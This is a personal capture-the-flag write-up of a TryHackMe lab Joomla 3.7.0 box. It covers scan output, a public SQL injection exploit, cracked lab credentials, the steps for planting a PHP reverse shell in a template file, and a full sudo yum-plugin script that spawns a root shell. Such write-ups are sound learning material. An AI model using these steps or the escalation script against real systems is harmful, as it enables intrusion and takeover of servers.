# namp

```shell
Nmap scan report for 10.10.196.247
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)

```

# dir

```shell
/images               (Status: 301) [Size: 236] [--> http://10.10.196.247/images/]
/index.php            (Status: 200) [Size: 9280]                                  
/templates            (Status: 301) [Size: 239] [--> http://10.10.196.247/templates/]
/media                (Status: 301) [Size: 235] [--> http://10.10.196.247/media/]    
/modules              (Status: 301) [Size: 237] [--> http://10.10.196.247/modules/]  
/bin                  (Status: 301) [Size: 233] [--> http://10.10.196.247/bin/]      
/plugins              (Status: 301) [Size: 237] [--> http://10.10.196.247/plugins/]  
/includes             (Status: 301) [Size: 238] [--> http://10.10.196.247/includes/] 
/language             (Status: 301) [Size: 238] [--> http://10.10.196.247/language/] 
/components           (Status: 301) [Size: 240] [--> http://10.10.196.247/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.196.247/cache/]     
/libraries            (Status: 301) [Size: 239] [--> http://10.10.196.247/libraries/] 
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.196.247/tmp/]       
/layouts              (Status: 301) [Size: 237] [--> http://10.10.196.247/layouts/]   
/administrator        (Status: 301) [Size: 243] [--> http://10.10.196.247/administrator/]
/configuration.php    (Status: 200) [Size: 0]                                            
/cli3.7.0(Status: 301) [Size: 233] [--> http://10.10.196.247/cli/] 
```

Joomla version  `3.7.0`

exploit `https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py`

Found user ['811', 'Super User', 'jonah', '**jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm',**

**joomla credential**  `Jonah:spiderman123 `

**shell access**

![](https://muirlandoracle.co.uk/wp-content/uploads/2020/02/13-2.png)

![](https://muirlandoracle.co.uk/wp-content/uploads/2020/02/14-2.png)

Extensions -> Templates -> Templates

- And changing the error.php file with php reverse shell and save 
- start nc listener
- Triger the error page and check the nc listener.
- shell will be created

**configuration.php**

```php

	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';

```

jjameson ssh credential      `jjameson:nv5uz9r3ZEDzVjNu`

# privilege escalation

`sudo -l`

![image-20220507125640224](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220507125640224.png)

Run the following for root access

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```